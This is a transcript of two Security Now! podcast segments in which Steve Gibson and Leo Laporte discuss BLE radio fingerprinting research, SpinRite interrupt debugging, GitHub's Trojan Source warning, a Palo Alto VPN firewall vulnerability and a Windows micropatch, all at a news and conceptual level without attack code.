STEVE:  Ugh.  Anyway, it's progress.  And following up on last week's Trojan Source topic, Joseph Lee tweeted:  "@SGgrc GitHub now has a warning about hidden Unicode directional control characters for source code."  And in the Halloween October 31st GitHub Changelog they said:  "Warning about bidirectional Unicode text.  A warning is now displayed when a file's contents include bidirectional Unicode text.  Such text can be interpreted or compiled differently than it appears in a user interface.  For example, hidden bidirectional Unicode characters can be used to swap segments of text in a file.  This can cause code to appear one way and be interpreted or compiled another way."  And of course that was last week's topic for the podcast, Trojan Source.



Some enterprising guys, two guys in the U.K. figured out that you could use the right-to-left reading and left-to-right reading escape characters to swap pieces of text in source code.  It would look perfectly fine to anyone reviewing the code, but it would act very differently when it was compiled.  So a very cool topic, and nice that GitHub - we're seeing indications that the industry is taking this as seriously as I think they should.



Okay.  I'm still dealing with the fallout from SpinRite's fifth technology development release.  Actually I may now just barely be past dealing with the fallout.  But we learned something of phenomenal importance last week.  There are motherboard and add-in adapter BIOSes which do not correctly report the hardware interrupt their devices use.  I received so many notes from our listeners saying that they really enjoyed my discussion of tracking down that problem with the ThinkPad whose NVMe controller had kind of died in a really weird way, and then coming up with a way to recover its BitLocker-encrypted drive contents when I didn't have any recovery key, that I'm not going to shy away from a bit of technical talk here.



Several testers of releases 4 and 5 reported hangs or timeouts on their systems.  On release number 5 we had many fewer problems than on release 4 since I had found and fixed the trouble I was having with Intel chipsets when configured for ATA, but not AHCI, operation.  But the developer pre-release number 5 was still having some hangs.  I believe that any problem, as a developer, any problem I can reproduce, I can fix.  And I was unable to make any such hang happen.



So I purchased one of the same adapters that one of our testers was using that was having trouble.  It was a little IO Crest adapter - I got it from Amazon for I think it was 20 bucks - using a Marvell chip and offering both serial SATA and parallel old-school IDE parallel cable connections.  If drives were connected to its SATA ports, no problem.  SpinRite cruised right through.  But attach a drive to its IDE parallel cable and, blammo, a hard full-system hang that only the reset button or a full power cycle would end.



As I stepped through the code, instruction by instruction, the moment I tried to execute an instruction that had the controller send a command to its drive to actually do something, the debugger never returned from stepping into that instruction, and the entire system was locked up hard.  The only thing I could do was reset.  And the only thing that could do what I saw was a hardware interrupt.



Hardware interrupts are such an incredibly powerful innovation in computing that it's difficult to imagine life without them. The UNIVAC 1103, from 1953, is generally credited with the first use of hardware interrupts.  And since that was also so near the birth of computing, it's clear that the early pioneers of computing themselves quickly realized the limitations of purely sequential instruction-by-instruction program flow.  Normally, one CPU instruction follows the next, with programmed jumps and loops, both conditional and unconditional, to facilitate complex logic flows.



A hardware interrupt does exactly what its name says.  Some hardware event interrupts that pre-programmed flow of instructions.  When the interrupt occurs, the CPU's program counter is saved, and a new program location is loaded into it.  Thus the hardware event causes the computer to instantly jump to some other location of its code.  An example might be to count the ticks of a hardware clock in order to maintain the time of day for the system.  Once that clock tick has been counted, the hardware interrupt would be ended  we say that the interrupt has been "serviced"  by restoring the program counter to its previously saved value, which causes the CPU to resume executing code from the point of its interruption as if nothing had happened at all.  It's completely transparent from the standpoint of the code.



And of course we old-timers will recall the early days of the PC with its ISA bus, when interrupts were a real problem.  There were only 15 hardware interrupts available back then, with the system's clock and its keyboard always occupying the first two.  But pretty much every peripheral added  com ports, printer ports, the screen, the floppy drive, hard disk drives, everything  each needed to have their own dedicated hardware interrupt request signal, or IRQ, as it's called.  So as you added more stuff to your system, juggling those interrupts often posed a real challenge.



Okay.  Now it's 2021, and executing an instruction that would generate an interrupt was locking up the system.  So exactly as with the early UNIVAC 1103 back in 1953, the CPU, this Intel CPU I was testing, was being yanked away from executing my code.  Only in this case, the CPU was never returning.  So I tested the theory that an interrupt was causing the trouble by disabling the drive's hardware interrupts.  It's possible to tell a drive not to generate an interrupt request when it needs attention.  And sure enough, no hang.  So to be sure, I reenabled the drive's interrupts, but disabled the entire system's interrupt servicing system.  It turns out that's possible to do because there are times when one's code absolutely positively must not be interrupted for any reason.  And again, no hang.  So that told me where the trouble was.



So I dug in and discovered that the controller's BIOS was reporting that its controller interrupted on IRQ 5 when it was actually interrupting on IRQ 11.  That mattered.  I was waiting for the drive to signal its completion on IRQ 5, so I had placed code there ahead of time to receive and handle that interruption.  But instead, by signaling its completion on IRQ 11, when I single-stepped into that instruction, control of the processor was yanked over to whatever code might have been handling IRQ 11, if any, and disaster struck.



This sort of problem never occurred in any previous versions of SpinRite because all previous SpinRites have used whatever BIOS was present, and the BIOS always knew the truth itself, even if it wouldn't tell the truth to anyone else when asked.  So having obtained absolute proof that there are motherboard firmware and add-in adapter BIOSes out in the world that do not accurately report the IRQ that's being signaled by their hardware, I needed to switch to Plan B.



As of the end of this past weekend, SpinRite no longer cares at all which hardware IRQ is signaled for completion.  Since IRQ 0 and 1 are permanently connected to the clock and the keyboard, SpinRite now monitors all of the remaining 13 interrupt lines at once, in parallel.  And as a result, SpinRite is now working perfectly on that controller, where before it had a hard hang.  And once I publish the next dev release, we'll see how many of the other similar-appearing problems have also been resolved with this change.  But it does feel like we're getting close.



So anyway, a cool little bit of field problem-solving.  And I had to take sort of an out-of-box solution.  You could normally, on a normal OS, you could never get away with hooking all of the interrupts.  First of all, in today's operating systems there's a gazillion of them.  It's not like the ISA bus days.  PCI has completely changed the complexion of interrupts.  But more importantly, I mean, there's so much going on all at the same time that it's just not feasible to squat on all the hardware interrupts on a system.



SpinRite has the advantage of owning the entire system.  Nothing else is going on.  You've got timer ticks on Interrupt 0.  You've got the user using the UI on Interrupt 1.  And then nothing else is happening.  So basically I just grab all of the remaining 13 interrupts and look for any activity on any of them, and take that to mean that the disk finished its work.  And that worked.  So we didn't have many problems remaining.  We'll see how many are extinguished by this when I release number 6.



LEO:  Nice, nice.



STEVE:  Yeah, very cool.



LEO:  And now let's talk about Bluetooth with Steve.



STEVE:  Yup.  So seven researchers from the University of California at San Diego have completed some very important privacy-related research which will be formally presented during the upcoming 2022 IEEE Symposium on Security and Privacy.  The title of their paper provides the first hint into what they've found.  It's titled "Evaluating Physical-Layer BLE Location Tracking Attacks on Mobile Devices."  BLE, of course, Bluetooth Low Energy.  The key is their use of the term "physical" layer, rather than "logical" or "data" or "application" layer.  In other words, something about the way the Bluetooth radio is transmitting, not what the Bluetooth radio is transmitting.



So here's how they introduce their work in their paper's abstract.  They said:  "Mobile devices increasingly function as wireless tracking beacons.  Using the Bluetooth Low Energy protocol, mobile devices such as smartphones and smartwatches continuously transmit beacons to inform passive listeners about device locations for applications such as digital contact tracing for COVID-19, and even finding lost devices.  These applications use cryptographic anonymity that limit an adversary's ability to use these beacons to stalk a user.  However, attackers can bypass these defenses by fingerprinting the unique physical-layer imperfections in the transmissions of specific devices.



"We empirically demonstrate that there are several key challenges that can limit an attacker's ability to find a stable physical layer identifier to uniquely identify mobile devices using Bluetooth Low Energy, including variations in the hardware design of BLE chipsets, transmission power levels, differences in thermal conditions, and limitations of inexpensive radios that can be widely deployed to capture raw physical-layer signals.  We evaluated how much each of these factors limits accurate fingerprinting in a large-scale field study of hundreds of uncontrolled Bluetooth Low Energy devices, revealing that physical-layer identification is a viable, although sometimes unreliable, way for an attacker to track mobile devices."



Okay.  So what we're talking about here is exploring the feasibility of fingerprinting individual Bluetooth radios located in our consumer pockets, using subtle differences in individual device RF emissions.  It turns out that this is far from the first time that some researchers have considered and looked into the possibility of doing this.



Okay.  So for example, here are some titles of previous papers submitted through the years and presented during various security, communications, and engineering conferences.  Back in 2006, "Detecting Rogue Devices in Bluetooth Networks Using Radio Frequency Fingerprinting."  In '07, "Implications of Radio Fingerprinting on the Security of Sensor Networks."  In '08 there were three papers:  "Wireless Device Identification with Radiometric Signatures," "Using Spectral Fingerprints to Improve Wireless Network Security," and "Passive Steady State RF Fingerprinting:  A Cognitive Technique for Scalable Deployment of Co-Channel Femtocell Underlays."  In '09, "Physical-Layer Identification of RFID Devices."  In 2011, "Identifying Wireless Users via Transmitter Imperfections."  In 2020, last year, "Aircraft Fingerprinting Using Deep Learning."



Okay.  So clearly the idea of fingerprinting a radio frequency transmitter by closely and carefully characterizing the details of its transmission  not the data it's transmitting but the precise way it's transmitting  is a well-established question, and a potential problem for our privacy.  Since the time that researchers began looking into all of this, as we know, we've all taken to carrying individual radios in our pockets, each of which is deliberately and constantly broadcasting RF beacon signals.  The designers of these technologies have gone out of their way with all sorts of fancy state-of-the-art crypto to cleverly and deeply anonymize the data that's being transmitted. But they've completely missed and skipped over the truth that inter-device differences may be sufficiently distinctive to render those devices individually identifiable.  That's the question that this UC San Diego team set out to answer.



So here's at the top of their paper how they explained how they see this.  They said:  "The mobile devices we carry every day, such as smartphones and smartwatches, increasingly function" - and as I look at this, it looks like it's exactly what I already read in the abstract.  They have a little more detail.  They talk about Apple and Google smartphones, as well as Apple's intrinsic Continuity protocol, used for automated device hand-off and other proximity beacons.



"However," they say, "by their nature, BLE wireless tracking beacons have the potential to introduce significant privacy risks.  For example, an adversary might stalk a user by placing BLE receivers near locations they might visit and then record the presence of the user's beacons.  To address these issues, common BLE proximity applications cryptographically anonymize and periodically rotate the identity of a mobile device in their beacons."  And they say:  "For instance, BLE devices periodically reencrypt their MAC address, while still allowing trusted devices to determine if these addresses match the device's true MAC address.  Similarly, COVID-19 contact tracing applications regularly rotate identifiers to ensure that receivers cannot link beacons from the same device over time."  And of course we covered that extensively when we talked about the joint Apple/Google COVID-19 contact tracing protocol.



So they said:  "While these mechanisms can foreclose the use of beacon content as a stable identifier, attackers can bypass these countermeasures by fingerprinting the device at a lower layer.  Specifically, prior work has demonstrated that wireless transmitters have imperfections introduced in manufacturing that produce a unique physical-layer fingerprint for that device, for example, Carrier Frequency Offset and various carrier modulation offsets.  Physical-layer fingerprints can reliably differentiate many kinds of wireless chipsets, including a recent attempt to distinguish among 10,000 WiFi chipsets."  That last bit of research they are pointing to was published last year titled "Deep Learning for RF Fingerprinting:  A Massive Experimental Study."  And that was published in the IEEE Internet of Things Magazine.



So they continue:  "To the best of our knowledge, no prior work has evaluated the practicality of such physical-layer identification attacks in a real-world environment.  Indeed, prior to Bluetooth Low Energy tracking beacons, no mobile device wireless protocol transmitted frequently enough, especially when idle, to make such an attack feasible."  So in other words, we've been advancing this technology.  Now we've got radios which are constantly spitting things out.  And in their paper, I didn't include it in the notes, I think it was, in the case of Apple, 853 beacon transmissions per minute.  So a lot, you know, frequent.  Thus you get a big sample of what a given radio is putting out.



They said:  "Additionally, there is no existing BLE fingerprinting tool that can measure the physical-layer imperfections in BLE transmissions accurately."  In other words, they had to invent something.  "Prior techniques for fingerprinting either provide low-precision fingerprints because they use short-duration transient signal features, or provide high-precision fingerprints, but require long-duration signal features which exist only in protocols like WiFi, but not in BLE."



They said:  "Our first contribution is a tool that uses a novel method to recover these imperfections by iteratively adding imperfections to a re-encoded clean copy of a received packet, until they match the imperfections of the received packet over the air."  So in other words, in order to determine the feasibility of actually doing this, that is, fingerprinting, they first needed to develop the best technology possible to do so.  And they did.  And very cleverly, they realized that Bluetooth Low Energy transmissions are inherently short bursts during which not enough information is gleaned.  But if you listen to a lot of those short bursts, they came up with a way of producing a high-resolution model from many short samples, short temporal samples. 



They said:  "Our next contribution is an evaluation of how practical it is for an attacker to track BLE-beaconing devices using their RF fingerprint.  Namely, using lab-bench experiments, we identify four primary challenges to identifying BLE devices in the field.  First, BLE devices have a variety of chipsets that have different hardware implementations.  Second, applications can configure the BLE transmit power level, resulting in some devices having lower signal-to-noise ratio BLE transmissions.  Third, the temperature range that mobile devices encounter in the field can introduce significant changes to physical-layer impairments.  And fourth, the low-cost receivers that an attacker can use in the wild for RF fingerprinting are not significantly less accurate than the tools used in prior studies."  In other words, they just used $150 software-defined radios.  It turns out that provides all the resolution and accuracy needed.



And they said:  "Our final contribution is a set of field experiments to evaluate how significantly these challenges diminish an attacker's ability to identify mobile devices in the field.  We leverage the fact that BLE tracking beacons are already used on many mobile devices.  We perform an uncontrolled field study where we evaluate the feasibility of tracking Bluetooth Low Energy devices when they're operating in public spaces where there are hundreds of other nearby devices.



"To the best of our knowledge, our work is the first to evaluate the feasibility of an RF fingerprinting attack in real-world scenarios.  We show that even when there are hundreds of devices we encountered in the field, it is still feasible to track a specific mobile device by its physical-layer fingerprint.  However, we also observe that certain devices have similar fingerprints to others, and temperature variations can change a device's metrics.  Both of these issues can lead to significant misidentification rates.  In summary, we find that physical-layer tracking of BLE devices is indeed feasible, but it is only reliable under limited conditions, and for specific devices with extremely unique fingerprints, and when the target device has a relatively stable temperature."



Okay.  So believe it or not, that's just the tip of iceberg.  Their wonderfully detailed paper goes on for 15 pages, and for anyone interested it provides all the detail anyone could want.  Even Spencer Webb, who, by the way, tweeted this link to me and put me onto the story.  Thank you, Spencer.  We've spoken of Spencer before.  He's a radio frequency antenna designer guru.  So of course this roused his interest.  All of the work that they did, and the datasets, they've posted publicly on GitHub.



And I'm tempted to conclude that there's nothing for us to worry about overall.  And for the most part that's the most reasonable conclusion.  But one part of their paper stuck out and caught my attention.  They conducted a case study of tracking a specific person.  And I'll read what they wrote and then clarify the tricky bits.  It's not very long.  It was in their paper, "Case Study 2:  Tracking a Person."



They said:  "We conducted an end-to-end tracking attack executed on a controlled target, a volunteer who uses an iPhone.  The attacker first carries their SDR (Software Defined Radio) sniffer close to the target device to obtain the device's physical-layer fingerprint.  Simultaneously, the attacker scans for nearby BLE devices using a commonly available BLE scanner phone app, and they record the MAC address of the BLE device with the highest observed signal strength, which will be the nearest device, the target's phone.  Then later, post-processing all of the data and signals collected, they use the target's MAC address to select out the target's device packets from the raw sniffer capture.  They feed those packets into the BLE tracking toolkit to train its classifier with the target device's fingerprint."



Okay.  "After creating the fingerprint, the attacker tracks their target by placing an SDR and laptop close to their target's home.  The attacker can determine when the target is home by observing when the classifier running on the laptop indicates the packets received by the SDR match the target device's fingerprint.  The attacker tracks their target for one hour in their study, during which the target walks inside and outside the house two times."  And in their paper Figure 18, which I've captured in the show notes below, "shows the number of unique MAC addresses observed every 10 seconds during this hour.  There are approximately 30 other devices nearby that could be confused with the target."  In other words, it is a Bluetooth Low Energy packed environment.



Then in the second chart on the right, the blue bar shown in Figure 19 shows what they called the ground truth of when the person was inside the house during this hour.  "The attacker's identification toolkit runs once every 10 seconds, and the red bar shows the time durations during which the tracking toolkit thinks the person was present.  The bars perfectly match except for immediately prior to minute 10, where the toolkit falsely detects the presence of the target for 50 seconds, even though it had not yet actually returned."



So again, our listeners can't see, but the first chart showing the number of Bluetooth Low Energy devices seen every 10 seconds for an hour, I mean, it's a ragged-looking chart that peaks, it looks like maybe peaks at about 37.  It hits a low point maybe at about 20.  But in general it's like, you know, easily 20 to 30 devices that are all generating beacons at the same time.  Despite that, and having never been trained on any of those, this device located outside the house, the right chart shows it's virtually perfectly aligned.  That is, when the person's in the house, this thing detects the radio defects of the transmission separately from all the other devices, never having been trained on any of them.



So to me, this was significant because it suggests that, while the natural variations in RF signal generation are not generally sufficient to identify arbitrary individuals within a large population, it may well be feasible to train up an inexpensive RF classifier to recognize a specific Bluetooth radio.  And remember the protocols that are being transmitted are anonymized.  The MAC address is being randomly changed.  We've talked about all of that being done in the past, specifically to thwart tracking.  Yet the layer under that, the layer essentially that carries the data, the analog layer, has enough variation in it that it can be seen uniquely, with sufficiently high accuracy that the same radio will later be recognized with a high probability of success.



And so you can imagine that law enforcement and counterterrorism agencies might find ample application for such passive device recognition.  You don't need to install malware on it.  You don't need to plant a bug on somebody.  You just briefly get near enough to capture their beacon blabbing, as all Bluetooth beacons now blab.  That gives you a sufficient number of samples to uniquely identify that device when it is again within radio range.



So I think this research has very usefully highlighted a weak, but potentially very significant flaw in the assumption that the only thing we need to be concerned about for protecting our anonymity and privacy is the digital data our radios transmit.  It's now clear that subtle differences in the analog component of the way they transmit can be significant.  And it feels as though this is the sort of thing that Apple and Qualcomm might find to be of sufficient concern that they might consider adding some deliberate noise into their radio modulation channels to thoroughly thwart this form of deanonymization attack.



Beautiful research by these guys, and something no one really, I mean, obviously people have been talking about it since '06.  But we just deployed all this technology, and it's like, okay, fine.  Let's make sure we scramble the data that we're sending.  Well, it turns out that there are enough differences in the radio that is being used to send the data that it could be identified from a crowd.  Very cool.



LEO:  This kind of beaconing happens on Android, too.  I'm sure, and I know they didn't try it with Android, but I bet you anything you could do it with Android.



STEVE:  Yeah.  And in fact let me - where is the research?  I've got it right here.



LEO:  Basically, beaconing, as soon as they announced beaconing, I said, "This is a bad idea."



STEVE:  Yeah, I agree.



LEO:  It doesn't benefit us as users.  It's totally for advertising, marketing, maybe museums.  But it's not really a user-facing technology. 



STEVE:  Yeah.  And we have no control over it; right?



LEO:  Yeah, yeah.  It's just you just have it, yeah.



STEVE:  Okay.  So iPhone 10 running iOS sends out 872 advertisements per minute.  They had a ThinkPad X1 Carbon running Windows.  That sent out, that was number two, 864 beacons per minute.  MacBook Pro 2016 running OS X, 576.  Apple Watch 4 iOS, 598.  Google Pixel 5 running Android, 510.



LEO:  There you go, yeah.



STEVE:  And the Bose QuietComfort 35 headphones, 77.



LEO:  You know, I'll never forget turning on, what was it, I think I was trying to pair my headphones.  As I was bicycling I was trying to pair - or I have a helmet, a Bluetooth helmet - to my phone, and then bicycling down the street and watching all the Bluetooth show up, all the different Bluetooth devices show up.  Bluetooth has never in any way attempted to hide itself.   Bluetooth devices announce themselves.  That's part of the technology.  And this beaconing is even worse.  The problem with the beaconing is you don't know it's doing it.  Yeah, I'm not at all surprised, yeah.



Steve, another brilliant job, and not a single rant.  Amazing.  Thank you, sir.  Actually, the listeners are very disappointed.  I hope you'll have something for us next week.  Steve is of course at GRC.com.  That is not just the home of SpinRite, the world's finest mass storage maintenance and recovery utility, currently version 6.0.  6.1 is, as you can tell, well on its way.  And you'll get a free copy if you buy 6.0 now.  You also get to participate in the development of the new SpinRite.



Many free things at his website including this show, 16Kb audio, handwritten transcriptions, 64Kb audio as well.  All you have to do is go to GRC.com, a great place to get the show and participate in a conversation about the show.  He's got forums there.  And you can leave even feedback at GRC.com/feedback.  He's on Twitter, @SGgrc.  So if you want to DM him, you can slide into his DMs there.  Or just tweet, "What could possibly go wrong?" and see what happens, @SGgrc.



We have the show at our website, as well.  Of course TWiT.tv/sn.  You can get copies of the audio and the video there.  If you want to watch us make the show live, we do it every Tuesday, right after MacBreak Weekly.  That's sometime between 1:30 and 2:00 p.m. Pacific, which would be 4:30 to 5:00 p.m. Eastern time, 20:30 UTC.  And if you want to watch or listen live, go there.  You can also go to live.twit.tv, resolves to the same thing.  If you're watching live, chat live in our chatroom, irc.twit.tv.  Club TWiT members also have access to our Discord.  You can chat there, too.  And you can also download shows after the fact, if you want, not only at the website, but subscribe in your favorite podcast player, and you'll get it automatically.  There's also a YouTube channel.



If you are subscribing and listening after the fact, there are also asynchronous ways to communicate besides Steve's forums at GRC.com.  We have our own TWiT Discourse forum at twit.community, and we have a Mastodon instance in the Fediverse at TWiT.social.  Both are free to join.  We'd love to have you on any of those platforms.  We love our community, and it's great to stay in touch.  Steve, have a wonderful week, and I'll see you next week on Security Now!.



STEVE:  Will do.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#845

DATE:		November 16, 2021

TITLE:		Blacksmith 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-845.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at a critical 9.8-rated vulnerability affecting Palo Alto Network's widely deployed VPN Firewall appliance, and at a welcome new micropatch from the 0patch guys, the nature of which leads me into a bit of philosophical musing about the Zen of coding.  We're then rocketed back to reality by a review of last week's Patch Tuesday, looking at what it broke and happily what more it fixed, including hints that Christmas might finally be coming to printing by December.  We have some more encouraging ransomware vs. the law news, and we examine the question of how to make big money defrauding online advertisers.  I'll then share some fun and interesting closing-the-loop feedback from our listeners and an update on my SpinRite work.  Then we're going to take a look at "Blacksmith," the evolution of Rowhammer attacks on DRAM.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We're going to talk about Patch Tuesday, 55 flaws.  Steve will break it down.  There's a security issue in a piece of security hardware you're going to want to know about.  And then the latest version of Rowhammer.  It's called Blacksmith, and it affects all DRAM everywhere.  It's all coming, oh boy, it's coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 845, recorded Tuesday, November 16th, 2021:  Blacksmith.



It's time for Security Now! the show where we protect you and your loved ones in the vast online world of cyberspace with this guy right here, who's been around since before cyberspace began.  What are you doing, Steve Gibson?



STEVE GIBSON:  It all is blowing up, Leo.  Just...



LEO:  It's blowing up.



STEVE:  ...kaboom, yes.



LEO:  Security Now! time.  I know you wait for this all week long.  So do I.  Here we are.  Hello, Steve.



STEVE:  Well, hello, Leo.  Hello.



LEO:  Hello.



STEVE:  So we have actually, the topic I was going to discuss got bumped to next week.  I was going to talk about something called HTTP Request Smuggling, which it turns out has been a known problem for a while; but it's only just become, like, abused.  So I thought, oh, that'll be fun to talk about.  But then yesterday a paper dropped from some guys at COMSEC who are the guys at ETH, I want to say Yurich, but that's not right.



LEO:  Zurich.



STEVE:  Zurich.  Hello.  Yes.  Zurich.  The security guys who've done, you know, we've referred to them a bunch through the years.  They've taken Rowhammer, the original DRAM Rowhammer problem, way further.  And it's not good.  So I thought, okay, that's more important than a, well, a problem which has just come into fashion, apparently.  So we have a lot of things to talk about.  We're going to look at a critical 9.8-rated vulnerability affecting Palo Alto Networks' widely developed VPN Firewall appliance, and at a welcome new micropatch from those 0patch guys.  And the nature of it leads me into a bit of a philosophical musing about the Zen of coding, which had me thinking of you because I know that - and also a little bit about chess and your affection for that.  But anyway, we'll get there.



LEO:  Boy, my two favorite subjects.  I can't wait.



STEVE:  Then we're rocketed back to reality by a review of last week's Patch Tuesday, looking at what it broke and, happily, what more it fixed, including hints that Christmas might finally be coming to printing by December.  But not yet, children.  We have some more encouraging ransomware vs. the law news, where the law apparently is winning.  And we examine the question of how to make big money defrauding online advertisers.  Then I'll share some fun and interesting closing-the-loop feedback from our listeners.  And, boy, have we got some neat listeners.  A brief update on my SpinRite work, and then we're going to take a look at Blacksmith, which is the evolution, probably the ultimate evolution of Rowhammer attacks on DRAM and the fact that nothing can be done. 



LEO:  Oh, no.



STEVE:  It's one of those happy endings.



LEO:  Oh, no.  And I hope you'll do a refresher on what Rowhammer is and all of that.



STEVE:  I've got that in the notes, yup, for sure.



LEO:  Because there are so many things; and, you know, we forget.



STEVE:  And then we do have, for those of us who have, well, not us, I'm no longer among them, but maybe Elaine, who she uses a satellite link, last time I checked, and her connection is slow, which is why she originally asked me if I could recompress these from your beautiful-sounding 64Kb down to 16 to conserve her bandwidth.  Well, there is a solution, it turns out, Leo, for people with highly constrained bandwidths who wish to install Windows 11.  And we've got the Picture of the Week to demonstrate that. 



LEO:  Okay.  No hints.  No clues.  But that's good.  That's coming up.  Ready for the Picture of the Week.  You have this picture, practically.



STEVE:  Yeah.  So someone tweeted this to me, and it just caught me at the right moment.  It was kind of funny because those old-timers among us recall when you did install Windows, like 3.1 came on a deck of 3.5" floppy disks.



LEO:  Show them your 8" Windows 1.



STEVE:  So, yeah, I actually just...



LEO:  Look at that.



STEVE:  It just occurred to me to pull those out of a drawer.  They weren't even giving it a version number at that point because it was just called Windows.



LEO:  Wow.



STEVE:  And of course it used to run on DOS.  So it wasn't its own operating system.  So the label says Windows Standalone Runtime System Setup Disk 1 of 2 and Utilities Disk 2 of 2, copyright 1984 and 1985.



LEO:  Nice.  Just to bring us up to the present, though.



STEVE:  Yes.  I was going to say, since then, Leo, there's been a little, I don't want to say "bloat," well, maybe I do.  We now have Windows 11 available on 3.5" disks.  This shows two of them of 3,852.



LEO:  Did you do the math to see if that's accurate?  I bet that's low.



STEVE:  Actually, in my head it's about right because you figure one of those is 1.44MB.  So 1.44MB times 3,852, that's going to bring you to around the, what, 5GB or so.



LEO:  Yeah, that's about right, yeah.



STEVE:  Which is where Windows 11 is now.  Now, of course it was always a problem, back when we were installing Windows from 3.5" floppies, is that you'd get about to the fourth disk, and it would go, eh eh eh eh and, like, you'd have a read problem.



LEO:  Oh, god, I remember those days.



STEVE:  So you'd eject it and put it back in again.



LEO:  Ugh.



STEVE:  And hope that you'd get like a better settling of the hub, which was metal on these.  The track density of these was high enough that you couldn't use just a standard Mylar hole.  So they had metal hubs in order to get better centering.  But even so, eh eh eh eh eh.  And it's like, oh, crap.  Now, given that installing Windows 11 this way would require 3,852 of these, I would say your chances of actually getting Windows 11 running are about the same as they are today when you download it and run it.  It's like, good luck.  Anyway, just a fun Picture of the Week, and thank you to whomever thought to send it.  I appreciate that.



LEO:  That is so true, too.  Gosh.  Thousands.



STEVE:  Yeah.  Okay.  So around 10,000 VPN Firewall appliances from Palo Alto Networks are vulnerable.  And once again, actually, I don't blame the tech press for calling it a zero-day  because the guys who found it called it a zero-day in their announcement.  So the tech press, who is, you know, just taking their copy from the announcement, parroted that; right?  They're calling it a zero-day.  Nothing about it is a zero-day, but it's definitely a very serious vulnerability with a vulnerability severity score of 9.8.  And as we know, we're still waiting for a 9.9 or a 10.  I don't know what that even looks like because everyone seems to hit the ceiling at 9.8.  But this is as bad as it gets, 9.8.



It affects, as I said, Palo Alto Networks.  The product is the GlobalProtect firewall, which allows unauthenticated remote control and remote code execution on multiple versions of their PAN-OS from a family version 8.1, prior to 8.1.17.  So that's where they fixed it, in 17.  If you've got 8.1 less than 17, you're in trouble.  And this affects both their physical and virtual firewalls.  The discovery was made by a group we've never referred to before known as Randori, R-A-N-D-O-R-I, and their site is Randori.com.



Their disclosure, which as I said also sadly labeled this as a zero-day, they wrote:  "The Randori Attack Team developed a reliable working exploit and leveraged the capability as part of Randori's continuous and automated red team platform.  Our team was able to gain a shell on the affected target, access sensitive configuration data, extract credentials, and more.  Once an attacker has control over the firewall, they'll have visibility into the internal network and can proceed to move laterally."



And of course this is a problem because there are 10,000 of these things out there, all vulnerable until they're patched, and we know how that goes.  And, you know, no mom-and-pop op is going to - I don't have one of these Palo Alto Networks firewalls.  I've got a nice little pfSense system here.  The point is that these are going to be serious enterprises that are using these Palo Alto GlobalProtect VPN firewalls, so they're going to be a hot target for guys who want to get in and get up to some mischief, moving laterally to do their nefarious ransomware stuff.



"So in an effort to avoid enabling misuse, technical details related to this" - it's been given a CVE number 2021-3064 - "will be withheld," they write, "from public dissemination for a period of 30 days from the date of this publication."  And again, that's why it's not a zero-day.  I mean, it's not in the wild.  It wasn't discovered being used.  It's a vulnerability.  So, okay, good that we found out about it.  They responsibly disclosed this at Palo Alto Networks, who quickly said, after recovering from their unhappiness, updated this 8.1.16 to 8.1.17, fixing the problem.  I'm sure they sent out announcements to anyone they had access to, hopefully stressing the importance of updating the appliance.



LEO:  So it's kind of a security success story.



STEVE:  Yeah.



LEO:  I mean, nothing's perfect.  You're going to have flaws.  You wish you wouldn't.



STEVE:  Yes, yes.  And as always, it's that last mile is the problem; right?  It's a security success story until we start covering the disasters which ensue when people don't patch; when they don't, like for whatever reason, communication failure, lack of resources, the IT security guys are too busy putting out other fires, you know, maybe the enterprise hired a consultant.  I hope they have somebody full-time on staff because that's now, like, required these days.  But what will happen is more than half of these will not get updated.  And Rodan has found them all.  These have been indexed so that bad guys can immediately target them, use unpatched versions to exploit them and then crawl in.  So, you know, yes.  It's a success story all the way, as I said, Leo, to like that last mile, which requires that people get these things kept current. 



LEO:  Shodan.  Shodan, not Rodan.  Shodan.



STEVE:  Oh, Shodan.



LEO:  No, I understand where Rodan came from because that's kind of sort of like the people who discovered this.  So that's what confused me at first.



STEVE:  Right, Randori, right.



LEO:  Yeah, Randori, yeah.



STEVE:  So anyway, this question of should things update themselves autonomously.  You know, we're now, you know, the machines that we have in our pocket, they do that.  Windows has continued to push that further.  They have their monthly patch cycles; but now they've, like, started doing this other new thing because that's not in some cases often enough.  So they're able to update their Windows Defender patterns at any time they want to, and so block things that are coming in before Windows has had a chance to be strengthened against them.  So, you know, the fact is we're seeing this model evolve where updates are being delivered autonomously.



And it seems that there's still pushback.  When I talk about this for consumer routers, I get, not hate mail, but people saying, you know, think of what happens if a mistake is made.  And it's like, well, yeah.  But is that worse than a serious vulnerability being left unpatched by the bulk of the population?  Consider what the chances are of a consumer router ever being updated.  I mean, our listeners, yeah.  Pretty much more than that?  Probably not.



Anyway, the vulnerability chain consists of a method for bypassing validations made by an external web server, and that's where this term HTTP Smuggling comes in.  This is actually an HTTP Request Smuggling attack which we will be covering in detail next week.  We've never talked about it, and it's interesting.  And obviously here's an example of a really bad problem being impacted that way.  The good news is the Randori guys are acting responsibly.  They're keeping the details to themselves.  I'm sure they'll come out with full details in a month.  In the meantime, boy, if you or anyone you know is using a Palo Alto Networks VPN Gateway, make sure that you're patched.



The 0patch guys, who I think have found themselves a niche in the world, have produced a micropatch.  Recall that we recently discussed a worrisome local privilege escalation vulnerability in the Windows user profile service which affected, or I should say unfortunately affects, all versions of Windows.  This was that one that Abdelhamid Naceri discovered and privately, responsibly, properly disclosed to Microsoft months ago.  They then listed this as patched and fixed in August.  But after he  reverse engineered the change that Microsoft made to see what it was, he was kind of curious, oh, cool, how they fixed this.



He discovered that the only thing fixed was that the simple proof-of-concept demo he'd provided to demonstrate the more severe underlying problem no longer worked.  The underlying problem remained.  So it wasn't fixed in August when it was supposed to be, nor in September or October, or last Tuesday, in November.  On the one hand, if it's exploited, it allows an attacker to elevate themselves to full system, you know, root privilege under Windows.  But on the other hand, any such attacker would need to have knowledge of some second credential that would work on the same machine.



